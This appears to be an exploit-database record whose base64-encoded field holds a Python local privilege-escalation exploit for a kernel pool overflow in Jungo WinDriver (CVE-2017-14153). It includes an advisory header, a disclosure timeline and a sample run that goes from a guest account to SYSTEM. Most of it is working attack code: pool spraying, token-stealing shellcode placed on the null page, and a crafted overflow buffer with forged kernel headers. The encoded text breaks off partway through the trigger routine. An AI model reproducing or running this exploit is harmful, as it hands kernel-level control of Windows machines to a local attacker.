{
    "source": "exploit-database", 
    "exploit": "IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0NCiIiIg0KSnVuZ28gRHJpdmVyV2l6YXJkIFdpbkRyaXZlciBLZXJuZWwgUG9vbCBPdmVyZmxvdyBWdWxuZXJhYmlsaXR5DQoNCkRvd25sb2FkOiBodHRwOi8vd3d3Lmp1bmdvLmNvbS9zdC9wcm9kdWN0cy93aW5kcml2ZXIvDQpGaWxlOiAgICAgV0QxMjQwLkVYRQ0KU2hhMTogICAgIDM1MjdjYzk3NGVjODg1MTY2ZjBkOTZmNmFlZGM4ZTU0MmJiNjZjYmENCkRyaXZlcjogICB3aW5kcnZyMTI0MC5zeXMNClNoYTE6ICAgICAwZjIxMjA3NWQ4NmVmN2U4NTljMTk0MWY4ZTViOWU3YTZmMjU1OGFkDQpDVkU6ICAgICAgQ1ZFLTIwMTctMTQxNTMNCkF1dGhvcjogICBTdGV2ZW4gU2VlbGV5IChtcl9tZSkgb2YgU291cmNlIEluY2l0ZQ0KQWZmZWN0ZWQ6IDw9IHYxMi40LjANClRoYW5rczogICBiMzNmLCByeXVqaW4gYW5kIHNpY2tuZXNzDQpBbmFseXNpczogaHR0cDovL3NyY2luY2l0ZS5pby9ibG9nLzIwMTcvMDkvMDYvc2hhcmtzLWluLXRoZS1wb29sLW1peGVkLW9iamVjdC1leHBsb2l0YXRpb24taW4tdGhlLXdpbmRvd3Mta2VybmVsLXBvb2wuaHRtbA0KDQpTdW1tYXJ5Og0KPT09PT09PT0NCg0KVGhpcyB2dWxuZXJhYmlsaXR5IGFsbG93cyBsb2NhbCBhdHRhY2tlcnMgdG8gZXNjYWxhdGUgcHJpdmlsZWdlcyBvbiB2dWxuZXJhYmxlIGluc3RhbGxhdGlvbnMgb2YgSnVuZ28gV2luRHJpdmVyLiBBbiBhdHRhY2tlciBtdXN0IGZpcnN0IG9idGFpbiB0aGUgYWJpbGl0eSB0byBleGVjdXRlIGxvdy1wcml2aWxlZ2VkIGNvZGUgb24gdGhlIHRhcmdldCBzeXN0ZW0gaW4gb3JkZXIgdG8gZXhwbG9pdCB0aGlzIHZ1bG5lcmFiaWxpdHkuIA0KDQpUaGUgc3BlY2lmaWMgZmxhdyBleGlzdHMgd2l0aGluIHRoZSBwcm9jZXNzaW5nIG9mIElPQ1RMIDB4OTUzODI0YjcgYnkgdGhlIHdpbmRydnIxMjQwIGtlcm5lbCBkcml2ZXIuIFRoZSBpc3N1ZSBsaWVzIGluIHRoZSBmYWlsdXJlIHRvIHByb3Blcmx5IHZhbGlkYXRlIHVzZXItc3VwcGxpZWQgZGF0YSB3aGljaCBjYW4gcmVzdWx0IGluIGEga2VybmVsIHBvb2wgb3ZlcmZsb3cuIEFuIGF0dGFja2VyIGNhbiBsZXZlcmFnZSB0aGlzIHZ1bG5lcmFiaWxpdHkgdG8gZXhlY3V0ZSBhcmJpdHJhcnkgY29kZSB1bmRlciB0aGUgY29udGV4dCBvZiBrZXJuZWwuDQoNClRpbWVsaW5lOg0KPT09PT09PT09DQoNCjIwMTctMDgtMjIg4oCTIFZlcmlmaWVkIGFuZCBzZW50IHRvIEp1bmdvIHZpYSBzYWxlc0AvZmlyc3RAL3NlY3VyaXR5QC9pbmZvQGp1bmdvLmNvbQ0KMjAxNy0wOC0yNSDigJMgTm8gcmVzcG9uc2UgZnJvbSBKdW5nbyBhbmQgdHdvIGJvdW5jZWQgZW1haWxzDQoyMDE3LTA4LTI2IOKAkyBBdHRlbXB0ZWQgYSBmb2xsb3cgdXAgd2l0aCB0aGUgdmVuZG9yIHZpYSB3ZWJzaXRlIGNoYXQNCjIwMTctMDgtMjYg4oCTIE5vIHJlc3BvbnNlIHZpYSB0aGUgd2Vic2l0ZSBjaGF0DQoyMDE3LTA5LTAzIOKAkyBSZWNpZXZlZCBhbiBlbWFpbCBmcm9tIGEgSnVuZ28gcmVwcmVzZW50YXRpdmUgc3RhdGluZyB0aGF0IHRoZXkgYXJlICJsb29raW5nIGludG8gaXQiDQoyMDE3LTA5LTAzIOKAkyBSZXF1ZXN0ZWQgYSB0aW1lZnJhbWUgZm9yIHBhdGNoIGRldmVsb3BtZW50IGFuZCB3YXJuZWQgb2YgcG9zc2libGUgMGRheSByZWxlYXNlDQoyMDE3LTA5LTA2IOKAkyBObyByZXNwb25zZSBmcm9tIEp1bmdvDQoyMDE3LTA5LTA2IOKAkyBQdWJsaWMgMGRheSByZWxlYXNlIG9mIGFkdmlzb3J5DQoNCkV4YW1wbGU6DQo9PT09PT09PQ0KDQpDOlxVc2Vyc1xHdWVzdFxEZXNrdG9wPmljYWNscyBwb2MucHkNCnBvYy5weSBOVCBBVVRIT1JJVFlcQXV0aGVudGljYXRlZCBVc2VyczooSSkoRikNCiAgICAgICBOVCBBVVRIT1JJVFlcU1lTVEVNOihJKShGKQ0KICAgICAgIEJVSUxUSU5cQWRtaW5pc3RyYXRvcnM6KEkpKEYpDQogICAgICAgQlVJTFRJTlxVc2VyczooSSkoRikNCiAgICAgICBNYW5kYXRvcnkgTGFiZWxcTG93IE1hbmRhdG9yeSBMZXZlbDooSSkoTlcpDQoNClN1Y2Nlc3NmdWxseSBwcm9jZXNzZWQgMSBmaWxlczsgRmFpbGVkIHByb2Nlc3NpbmcgMCBmaWxlcw0KDQpDOlxVc2Vyc1xHdWVzdFxEZXNrdG9wPndob2FtaQ0KZGVidWdlZVxndWVzdA0KDQpDOlxVc2Vyc1xHdWVzdFxEZXNrdG9wPnBvYy5weQ0KDQogICAgICAgIC0tWyBKdW5nbyBEcml2ZXJXaXphcmQgV2luRHJpdmVyIEtlcm5lbCBQb29sIE92ZXJmbG93IEVvUCBleHBsb2l0IF0NCiAgICAgICAgICAgICAgICAgICAgICAgU3RldmVuIFNlZWxleSAobXJfbWUpIG9mIFNvdXJjZSBJbmNpdGUNCg0KKCspIHNwcmF5aW5nIHBvb2wgd2l0aCBtaXhlZCBvYmplY3RzLi4uDQooKykgc3ByYXllZCB0aGUgcG9vbCENCigrKSBtYWtpbmcgcG9vbCBob2xlcy4uLg0KKCspIG1hZGUgdGhlIHBvb2wgaG9sZXMhDQooKykgYWxsb2NhdGluZyBzaGVsbGNvZGUuLi4NCigrKSBhbGxvY2F0ZWQgdGhlIHNoZWxsY29kZSENCigrKSB0cmlnZ2VyaW5nIHBvb2wgb3ZlcmZsb3cuLi4NCigrKSBhbGxvY2F0aW5nIHBvb2wgb3ZlcmZsb3cgaW5wdXQgYnVmZmVyDQooKykgZWxldmF0aW5nIHByaXZpbGVnZXMhDQpNaWNyb3NvZnQgV2luZG93cyBbVmVyc2lvbiA2LjEuNzYwMV0NCkNvcHlyaWdodCAoYykgMjAwOSBNaWNyb3NvZnQgQ29ycG9yYXRpb24uICBBbGwgcmlnaHRzIHJlc2VydmVkLg0KDQpDOlxVc2Vyc1xHdWVzdFxEZXNrdG9wPndob2FtaQ0KbnQgYXV0aG9yaXR5XHN5c3RlbQ0KDQpDOlxVc2Vyc1xHdWVzdFxEZXNrdG9wPg0KIiIiDQpmcm9tIGN0eXBlcyBpbXBvcnQgKg0KZnJvbSBjdHlwZXMud2ludHlwZXMgaW1wb3J0ICoNCmltcG9ydCBzdHJ1Y3QsIHN5cywgb3MsIHRpbWUNCmZyb20gcGxhdGZvcm0gaW1wb3J0IHJlbGVhc2UsIGFyY2hpdGVjdHVyZQ0KDQpudGRsbCAgICA9IHdpbmRsbC5udGRsbA0Ka2VybmVsMzIgPSB3aW5kbGwua2VybmVsMzINCk1FTV9DT01NSVQgICAgICAgICAgICAgPSAweDAwMDAxMDAwDQpNRU1fUkVTRVJWRSAgICAgICAgICAgID0gMHgwMDAwMjAwMA0KUEFHRV9FWEVDVVRFX1JFQURXUklURSA9IDB4MDAwMDAwNDANClNUQVRVU19TVUNDRVNTICAgICAgICAgICAgICA9IDB4MA0KU1RBVFVTX0lORk9fTEVOR1RIX01JU01BVENIID0gMHhDMDAwMDAwNA0KU1RBVFVTX0lOVkFMSURfSEFORExFICAgICAgID0gMHhDMDAwMDAwOA0KU3lzdGVtRXh0ZW5kZWRIYW5kbGVJbmZvcm1hdGlvbiA9IDY0DQoNCmNsYXNzIExTQV9VTklDT0RFX1NUUklORyhTdHJ1Y3R1cmUpOg0KICAgICIiIlJlcHJlc2VudCB0aGUgTFNBX1VOSUNPREVfU1RSSU5HIG9uIG50ZGxsLiIiIg0KICAgIF9maWVsZHNfID0gWw0KICAgICAgICAoIkxlbmd0aCIsIFVTSE9SVCksDQogICAgICAgICgiTWF4aW11bUxlbmd0aCIsIFVTSE9SVCksDQogICAgICAgICgiQnVmZmVyIiwgTFBXU1RSKSwNCiAgICBdDQoNCmNsYXNzIFNZU1RFTV9IQU5ETEVfVEFCTEVfRU5UUllfSU5GT19FWChTdHJ1Y3R1cmUpOg0KICAgICIiIlJlcHJlc2VudCB0aGUgU1lTVEVNX0hBTkRMRV9UQUJMRV9FTlRSWV9JTkZPIG9uIG50ZGxsLiIiIg0KICAgIF9maWVsZHNfID0gWw0KICAgICAgICAoIk9iamVjdCIsIGNfdm9pZF9wKSwNCiAgICAgICAgKCJVbmlxdWVQcm9jZXNzSWQiLCBVTE9ORyksDQogICAgICAgICgiSGFuZGxlVmFsdWUiLCBVTE9ORyksDQogICAgICAgICgiR3JhbnRlZEFjY2VzcyIsIFVMT05HKSwNCiAgICAgICAgKCJDcmVhdG9yQmFja1RyYWNlSW5kZXgiLCBVU0hPUlQpLA0KICAgICAgICAoIk9iamVjdFR5cGVJbmRleCIsIFVTSE9SVCksDQogICAgICAgICgiSGFuZGxlQXR0cmlidXRlcyIsIFVMT05HKSwNCiAgICAgICAgKCJSZXNlcnZlZCIsIFVMT05HKSwNCiAgICBdDQogDQpjbGFzcyBTWVNURU1fSEFORExFX0lORk9STUFUSU9OX0VYKFN0cnVjdHVyZSk6DQogICAgIiIiUmVwcmVzZW50IHRoZSBTWVNURU1fSEFORExFX0lORk9STUFUSU9OIG9uIG50ZGxsLiIiIg0KICAgIF9maWVsZHNfID0gWw0KICAgICAgICAoIk51bWJlck9mSGFuZGxlcyIsIFVMT05HKSwNCiAgICAgICAgKCJSZXNlcnZlZCIsIFVMT05HKSwNCiAgICAgICAgKCJIYW5kbGVzIiwgU1lTVEVNX0hBTkRMRV9UQUJMRV9FTlRSWV9JTkZPX0VYICogMSksDQogICAgXQ0KDQpjbGFzcyBQVUJMSUNfT0JKRUNUX1RZUEVfSU5GT1JNQVRJT04oU3RydWN0dXJlKToNCiAgICAiIiJSZXByZXNlbnQgdGhlIFBVQkxJQ19PQkpFQ1RfVFlQRV9JTkZPUk1BVElPTiBvbiBudGRsbC4iIiINCiAgICBfZmllbGRzXyA9IFsNCiAgICAgICAgKCJOYW1lIiwgTFNBX1VOSUNPREVfU1RSSU5HKSwNCiAgICAgICAgKCJSZXNlcnZlZCIsIFVMT05HICogMjIpLA0KICAgIF0NCg0KY2xhc3MgUFJPQ0VTU0VOVFJZMzIoU3RydWN0dXJlKToNCiAgICBfZmllbGRzXyA9IFsNCiAgICAgICAgKCJkd1NpemUiLCBjX3Vsb25nKSwNCiAgICAgICAgKCJjbnRVc2FnZSIsIGNfdWxvbmcpLA0KICAgICAgICAoInRoMzJQcm9jZXNzSUQiLCBjX3Vsb25nKSwNCiAgICAgICAgKCJ0aDMyRGVmYXVsdEhlYXBJRCIsIGNfaW50KSwNCiAgICAgICAgKCJ0aDMyTW9kdWxlSUQiLCBjX3Vsb25nKSwNCiAgICAgICAgKCJjbnRUaHJlYWRzIiwgY191bG9uZyksDQogICAgICAgICgidGgzMlBhcmVudFByb2Nlc3NJRCIsIGNfdWxvbmcpLA0KICAgICAgICAoInBjUHJpQ2xhc3NCYXNlIiwgY19sb25nKSwNCiAgICAgICAgKCJkd0ZsYWdzIiwgY191bG9uZyksDQogICAgICAgICgic3pFeGVGaWxlIiwgY193Y2hhciAqIE1BWF9QQVRIKQ0KICAgIF0NCg0KUHJvY2VzczMyRmlyc3QgPSBrZXJuZWwzMi5Qcm9jZXNzMzJGaXJzdFcNClByb2Nlc3MzMk5leHQgID0ga2VybmVsMzIuUHJvY2VzczMyTmV4dFcNCg0KZGVmIHNpZ25lZF90b191bnNpZ25lZChzaWduZWQpOg0KICAgICIiIg0KICAgIENvbnZlcnQgc2lnbmVkIHRvIHVuc2lnbmVkIGludGVnZXIuDQogICAgIiIiDQogICAgdW5zaWduZWQsID0gc3RydWN0LnVucGFjayAoIkwiLCBzdHJ1Y3QucGFjayAoImwiLCBzaWduZWQpKQ0KICAgIHJldHVybiB1bnNpZ25lZA0KICAgICAgICAgICAgICAgIA0KZGVmIGdldF90eXBlX2luZm8oaGFuZGxlKToNCiAgICAiIiINCiAgICBHZXQgdGhlIGhhbmRsZSB0eXBlIGluZm9ybWF0aW9uIHRvIGZpbmQgb3VyIHNwcmF5ZWQgb2JqZWN0cy4NCiAgICAiIiINCiAgICBwdWJsaWNfb2JqZWN0X3R5cGVfaW5mb3JtYXRpb24gPSBQVUJMSUNfT0JKRUNUX1RZUEVfSU5GT1JNQVRJT04oKQ0KICAgIHNpemUgPSBEV09SRChzaXplb2YocHVibGljX29iamVjdF90eXBlX2luZm9ybWF0aW9uKSkNCiAgICB3aGlsZSBUcnVlOg0KICAgICAgICByZXN1bHQgPSBzaWduZWRfdG9fdW5zaWduZWQoDQogICAgICAgICAgICBudGRsbC5OdFF1ZXJ5T2JqZWN0KA0KICAgICAgICAgICAgICAgIGhhbmRsZSwgMiwgYnlyZWYocHVibGljX29iamVjdF90eXBlX2luZm9ybWF0aW9uKSwgc2l6ZSwgTm9uZSkpDQogICAgICAgIGlmIHJlc3VsdCA9PSBTVEFUVVNfU1VDQ0VTUzoNCiAgICAgICAgICAgIHJldHVybiBwdWJsaWNfb2JqZWN0X3R5cGVfaW5mb3JtYXRpb24uTmFtZS5CdWZmZXINCiAgICAgICAgZWxpZiByZXN1bHQgPT0gU1RBVFVTX0lORk9fTEVOR1RIX01JU01BVENIOg0KICAgICAgICAgICAgc2l6ZSA9IERXT1JEKHNpemUudmFsdWUgKiA0KQ0KICAgICAgICAgICAgcmVzaXplKHB1YmxpY19vYmplY3RfdHlwZV9pbmZvcm1hdGlvbiwgc2l6ZS52YWx1ZSkNCiAgICAgICAgZWxpZiByZXN1bHQgPT0gU1RBVFVTX0lOVkFMSURfSEFORExFOg0KICAgICAgICAgICAgcmV0dXJuIE5vbmUNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHJhaXNlIHhfZmlsZV9oYW5kbGVzKCJOdFF1ZXJ5T2JqZWN0LjIiLCBoZXggKHJlc3VsdCkpDQoNCmRlZiBnZXRfaGFuZGxlcygpOg0KICAgICIiIg0KICAgIFJldHVybiBhbGwgdGhlIHByb2Nlc3NlcyBoYW5kbGVzIGluIHRoZSBzeXN0ZW0gYXQgdGhlIHRpbWUuDQogICAgQ2FuIGJlIGRvbmUgZnJvbSBMSSAoTG93IEludGVncml0eSkgbGV2ZWwgb24gV2luZG93cyA3IHg4Ni4NCiAgICAiIiINCiAgICBzeXN0ZW1faGFuZGxlX2luZm9ybWF0aW9uID0gU1lTVEVNX0hBTkRMRV9JTkZPUk1BVElPTl9FWCgpDQogICAgc2l6ZSA9IERXT1JEIChzaXplb2YgKHN5c3RlbV9oYW5kbGVfaW5mb3JtYXRpb24pKQ0KICAgIHdoaWxlIFRydWU6DQogICAgICAgIHJlc3VsdCA9IG50ZGxsLk50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbigNCiAgICAgICAgICAgIFN5c3RlbUV4dGVuZGVkSGFuZGxlSW5mb3JtYXRpb24sDQogICAgICAgICAgICBieXJlZihzeXN0ZW1faGFuZGxlX2luZm9ybWF0aW9uKSwNCiAgICAgICAgICAgIHNpemUsDQogICAgICAgICAgICBieXJlZihzaXplKQ0KICAgICAgICApDQogICAgICAgIHJlc3VsdCA9IHNpZ25lZF90b191bnNpZ25lZChyZXN1bHQpDQogICAgICAgIGlmIHJlc3VsdCA9PSBTVEFUVVNfU1VDQ0VTUzoNCiAgICAgICAgICAgIGJyZWFrDQogICAgICAgIGVsaWYgcmVzdWx0ID09IFNUQVRVU19JTkZPX0xFTkdUSF9NSVNNQVRDSDoNCiAgICAgICAgICAgIHNpemUgPSBEV09SRChzaXplLnZhbHVlICogNCkNCiAgICAgICAgICAgIHJlc2l6ZShzeXN0ZW1faGFuZGxlX2luZm9ybWF0aW9uLCBzaXplLnZhbHVlKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcmFpc2UgeF9maWxlX2hhbmRsZXMoIk50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbiIsIGhleChyZXN1bHQpKQ0KDQogICAgcEhhbmRsZXMgPSBjYXN0KA0KICAgICAgICBzeXN0ZW1faGFuZGxlX2luZm9ybWF0aW9uLkhhbmRsZXMsDQogICAgICAgIFBPSU5URVIoU1lTVEVNX0hBTkRMRV9UQUJMRV9FTlRSWV9JTkZPX0VYICogXA0KICAgICAgICAgICAgICAgIHN5c3RlbV9oYW5kbGVfaW5mb3JtYXRpb24uTnVtYmVyT2ZIYW5kbGVzKQ0KICAgICkNCiAgICBmb3IgaGFuZGxlIGluIHBIYW5kbGVzLmNvbnRlbnRzOg0KICAgICAgICB5aWVsZCBoYW5kbGUuVW5pcXVlUHJvY2Vzc0lkLCBoYW5kbGUuSGFuZGxlVmFsdWUsIGhhbmRsZS5PYmplY3QNCg0KZGVmIHdlX2Nhbl9hbGxvY19zaGVsbGNvZGUoKToNCiAgICAiIiIgDQogICAgVGhpcyBmdW5jdGlvbiBhbGxvY2F0ZXMgdGhlIHNoZWxsY29kZSBAIHRoZSBudWxsIHBhZ2UgbWFraW5nDQogICAgc3VyZSB0aGUgbmV3IE9rYXlUb0Nsb3NlUHJvY2VkdXJlIHBvaW50ZXIgcG9pbnRzIHRvIHNoZWxsY29kZS4NCiAgICAiIiINCiAgICBiYXNlYWRkICAgPSBjX2ludCgweDAwMDAwMDA0KQ0KICAgIG51bGxfc2l6ZSA9IGNfaW50KDB4MTAwMCkNCg0KICAgIHRva2Vuc3RlYWxpbmcgPSAoDQogICAgIlx4MzNceEMwXHg2NFx4OEJceDgwXHgyNFx4MDFceDAwXHgwMFx4OEJceDQwXHg1MFx4OEJceEM4XHg4Qlx4ODAiDQogICAgIlx4QjhceDAwXHgwMFx4MDBceDJEXHhCOFx4MDBceDAwXHgwMFx4ODNceEI4XHhCNFx4MDBceDAwXHgwMFx4MDQiDQogICAgIlx4NzVceEVDXHg4Qlx4OTBceEY4XHgwMFx4MDBceDAwXHg4OVx4OTFceEY4XHgwMFx4MDBceDAwXHhDMlx4MTAiDQogICAgIlx4MDAiICkNCiAgICANCiAgICBPa2F5VG9DbG9zZVByb2NlZHVyZSA9IHN0cnVjdC5wYWNrKCI8TCIsIDB4MDAwMDAwNzgpDQogICAgc2MgID0gIlx4NDIiICogMHg3MCArIE9rYXlUb0Nsb3NlUHJvY2VkdXJlDQoNCiAgICAjIGZpcnN0IHdlIHJlc3RvcmUgb3VyIHNtYXNoZWQgVHlwZUluZGV4DQogICAgc2MgKz0gIlx4ODNceEM2XHgwYyIgICAgICAgICAgICAgICMgYWRkIGVzaSwgMGMNCiAgICBzYyArPSAiXHhjN1x4MDZceDBhXHgwMFx4MDhceDAwIiAgIyBtb3YgW2VzaV0sIDgwMDBhDQogICAgc2MgKz0gIlx4ODNceGVlXHgwYyIgICAgICAgICAgICAgICMgc3ViIGVzaSwgMGMgDQogICAgc2MgKz0gdG9rZW5zdGVhbGluZw0KICAgIHNjICs9ICJceDkwIiAqICgweDQwMC1sZW4oc2MpKQ0KICAgIG50ZGxsLk50QWxsb2NhdGVWaXJ0dWFsTWVtb3J5LmFyZ3R5cGVzID0gW2NfaW50LCBQT0lOVEVSKGNfaW50KSwgY191bG9uZywgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUE9JTlRFUihjX2ludCksIGNfaW50LCBjX2ludF0NCiAgICBkd1N0YXR1cyA9IG50ZGxsLk50QWxsb2NhdGVWaXJ0dWFsTWVtb3J5KDB4ZmZmZmZmZmYsIGJ5cmVmKGJhc2VhZGQpLCAweDAsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnlyZWYobnVsbF9zaXplKSwgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBNRU1fUkVTRVJWRXxNRU1fQ09NTUlULA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUEFHRV9FWEVDVVRFX1JFQURXUklURSkNCiAgICBpZiBkd1N0YXR1cyAhPSBTVEFUVVNfU1VDQ0VTUzoNCiAgICAgICAgcHJpbnQgIigtKSBlcnJvciB3aGlsZSBhbGxvY2F0aW5nIHRoZSBudWxsIHBhZ2VkIG1lbW9yeTogJXMiICUgZHdTdGF0dXMNCiAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgd3JpdHRlbiA9IGNfdWxvbmcoKQ0KICAgIHdyaXRlID0ga2VybmVsMzIuV3JpdGVQcm9jZXNzTWVtb3J5KDB4ZmZmZmZmZmYsIDB4MDAwMDAwMDQsIHNjLCAweDQwMCwgYnlyZWYod3JpdHRlbikpDQogICAgaWYgd3JpdGUgPT0gMDoNCiAgICAgICAgcHJpbnQgIigtKSBlcnJvciB3aGlsZSB3cml0aW5nIG91ciBqdW5rIHRvIHRoZSBudWxsIHBhZ2VkIG1lbW9yeTogJXMiICUgd3JpdGUNCiAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgcmV0dXJuIFRydWUNCg0KZGVmIHdlX2Nhbl9zcHJheSgpOg0KICAgICIiIg0KICAgIFNwcmF5IHRoZSBLZXJuZWwgUG9vbCB3aXRoIElvQ29tcGxldGlvblJlc2VydmUgYW5kIEV2ZW50IE9iamVjdHMuIA0KICAgIFRoZSBJb0NvbXBsZXRpb25SZXNlcnZlIG9iamVjdCBpcyAweDYwIGFuZCBFdmVudCBvYmplY3QgaXMgMHg0MCBieXRlcyBpbiBsZW5ndGguDQogICAgVGhlc2UgYXJlIGFsbG9jYXRlZCBmcm9tIHRoZSBOb25wYWdlZCBrZXJuZWwgcG9vbC4NCiAgICAiIiINCiAgICBoYW5kbGVzID0gW10NCiAgICBJT19DT01QTEVUSU9OX09CSkVDVCA9IDENCiAgICBmb3IgaSBpbiByYW5nZSgwLCAyNTAwMCk6DQogICAgICAgIGhhbmRsZXMuYXBwZW5kKHdpbmRsbC5rZXJuZWwzMi5DcmVhdGVFdmVudEEoMCwwLDAsMCkpDQogICAgICAgIGhIYW5kbGUgPSBIQU5ETEUoMCkNCiAgICAgICAgaGFuZGxlcy5hcHBlbmQobnRkbGwuTnRBbGxvY2F0ZVJlc2VydmVPYmplY3QoYnlyZWYoaEhhbmRsZSksIDB4MCwgSU9fQ09NUExFVElPTl9PQkpFQ1QpKQ0KDQogICAgIyBjb3VsZCBkbyB3aXRoIHNvbWUgYmV0dGVyIHZhbGlkYXRpb24NCiAgICBpZiBsZW4oaGFuZGxlcykgPiAwOg0KICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgIHJldHVybiBGYWxzZQ0KDQpkZWYgYWxsb2NfcG9vbF9vdmVyZmxvd19idWZmZXIoYmFzZSwgaW5wdXRfc2l6ZSk6DQogICAgIiIiDQogICAgQ3JhZnQgb3VyIHNwZWNpYWwgYnVmZmVyIHRvIHRyaWdnZXIgdGhlIG92ZXJmbG93Lg0KICAgICIiIg0KICAgIHByaW50ICIoKykgYWxsb2NhdGluZyBwb29sIG92ZXJmbG93IGlucHV0IGJ1ZmZlciINCiAgICBiYXNlYWRkICAgPSBjX2ludChiYXNlKQ0KICAgIHNpemUgPSBjX2ludChpbnB1dF9zaXplKQ0KICAgIGlucHV0ICA9ICJceDQxIiAqIDB4MTggICAgICAgICAgICAgICAgICAgICAjIG9mZnNldCB0byBzaXplDQogICAgaW5wdXQgKz0gc3RydWN0LnBhY2soIjxJIiwgMHgwMDAwMDA4ZCkgICAgICMgY29udHJvbGxlZCBzaXplICh0aGlzIHRyaWdnZXJzIHRoZSBvdmVyZmxvdykNCiAgICBpbnB1dCArPSAiXHg0MiIgKiAoMHg5MC1sZW4oaW5wdXQpKSAgICAgICAgIyBwYWRkaW5nIHRvIHN1cnZpdmUgYnNvZA0KICAgIGlucHV0ICs9IHN0cnVjdC5wYWNrKCI8SSIsIDB4MDAwMDAwMDApICAgICAjIHVzZSBhIE5VTEwgZHdvcmQgZm9yIHN1Yl80MTk2Q0ENCiAgICBpbnB1dCArPSAiXHg0MyIgKiAoKDB4NDYwLTB4OCktbGVuKGlucHV0KSkgIyBmaWxsIG91ciBwb29sIGJ1ZmZlcg0KICAgIA0KICAgICMgcmVwYWlyIHRoZSBhbGxvY2F0ZWQgY2h1bmsgaGVhZGVyLi4uDQogICAgaW5wdXQgKz0gc3RydWN0LnBhY2soIjxJIiwgMHgwNDBjMDA4YykgICAgICMgX1BPT0xfSEVBREVSDQogICAgaW5wdXQgKz0gc3RydWN0LnBhY2soIjxJIiwgMHhlZjQzNmY0OSkgICAgICMgX1BPT0xfSEVBREVSIChQb29sVGFnKQ0KICAgIGlucHV0ICs9IHN0cnVjdC5wYWNrKCI8SSIsIDB4MDAwMDAwMDApICAgICAjIF9PQkpFQ1RfSEVBREVSX1FVT1RBX0lORk8NCiAgICBpbnB1dCArPSBzdHJ1Y3QucGFjaygiPEkiLCAweDAwMDAwMDVjKSAgICAgIyBfT0JKRUNUX0hFQURFUl9RVU9UQV9JTkZPDQogICAgaW5wdXQgKz0gc3RydWN0LnBhY2soIjxJIiwgMHgwMDAwMDAwMCkgICAgICMgX09CSkVDVF9IRUFERVJfUVVPVEFfSU5GTw0KICAgIGlucHV0ICs9IHN0cnVjdC5wYWNrKCI8SSIsIDB4MDAwMDAwMDApICAgICAjIF9PQkpFQ1RfSEVBREVSX1FVT1RBX0lORk8NCiAgICBpbnB1dCArPSBzdHJ1Y3QucGFjaygiPEkiLCAweDAwMDAwMDAxKSAgICAgIyBfT0JKRUNUX0hFQURFUiAoUG9pbnRlckNvdW50KQ0KICAgIGlucHV0ICs9IHN0cnVjdC5wYWNrKCI8SSIsIDB4MDAwMDAwMDEpICAgICAjIF9PQkpFQ1RfSEVBREVSIChIYW5kbGVDb3VudCkNCiAgICBpbnB1dCArPSBzdHJ1Y3QucGFjaygiPEkiLCAweDAwMDAwMDAwKSAgICAgIyBfT0JKRUNUX0hFQURFUiAoTG9jaykNCiAgICBpbnB1dCArPSBzdHJ1Y3QucGFjaygiPEkiLCAweDAwMDgwMDAwKSAgICAgIyBfT0JKRUNUX0hFQURFUiAoVHlwZUluZGV4KQ0KICAgIGlucHV0ICs9IHN0cnVjdC5wYWNrKCI8SSIsIDB4MDAwMDAwMDApICAgICAjIF9PQkpFQ1RfSEVBREVSIChPYmplY3RDcmVhdGVJbmZvKQ0KICAgIA0KICAgICMgZmlsbGVyDQogICAgaW5wdXQgKz0gIlx4NDQiICogKGlucHV0X3NpemUtbGVuKGlucHV0KSkNCiAgICBudGRsbC5OdEFsbG9jYXRlVmlydHVhbE1lbW9yeS5hcmd0eXBlcyA9IFtjX2ludCwgUE9JTlRFUihjX2ludCksIGNfdWxvbmcsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBPSU5URVIoY19pbnQpLCBjX2ludCwgY19pbnRdDQogICAgZHdTdGF0dXMgPSBudGRsbC5OdEFsbG9jYXRlVmlydHVhbE1lbW9yeSgweGZmZmZmZmZmLCBieXJlZihiYXNlYWRkKSwgMHgwLCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ5cmVmKHNpemUpLCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1FTV9SRVNFUlZFfE1FTV9DT01NSVQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFKQ0KICAgIGlmIGR3U3RhdHVzICE9IFNUQVRVU19TVUNDRVNTOg0KICAgICAgICBwcmludCAiKC0pIGVycm9yIHdoaWxlIGFsbG9jYXRpbmcgbWVtb3J5OiAlcyIgJSBoZXgoZHdTdGF0dXMgKyAweGZmZmZmZmZmKQ0KICAgICAgICByZXR1cm4gRmFsc2UNCiAgICB3cml0dGVuID0gY191bG9uZygpDQogICAgd3JpdGUgPSBrZXJuZWwzMi5Xcml0ZVByb2Nlc3NNZW1vcnkoMHhmZmZmZmZmZiwgYmFzZSwgaW5wdXQsIGxlbihpbnB1dCksIGJ5cmVmKHdyaXR0ZW4pKQ0KICAgIGlmIHdyaXRlID09IDA6DQogICAgICAgIHByaW50ICIoLSkgZXJyb3Igd2hpbGUgd3JpdGluZyBvdXIgaW5wdXQgYnVmZmVyIG1lbW9yeTogJXMiICUgd3JpdGUNCiAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgcmV0dXJuIFRydWUNCg0KZGVmIHdlX2Nhbl90cmlnZ2VyX3RoZV9wb29sX292ZXJmbG93KCk6DQogICAgIiIiDQogICAgVGhpcyB0cmlnZ2VycyB0aGUgcG9vbCBvdmVyZmxvdyB2dWxuZXJhYmlsaXR5IHVzaW5nIGEgYnVmZmVyIG9mIHNpemUgMHg0NjAuDQogICAgIiIiDQogICAgR0VORVJJQ19SRUFEICA9IDB4ODAwMDAwMDANCiAgICBHRU5FUklDX1dSSVRFID0gMHg0MDAwMDAwMA0KICAgIE9QRU5fRVhJU1RJTkcgPSAweDMNCiAgICBERVZJQ0VfTkFNRSAgID0gIlxcX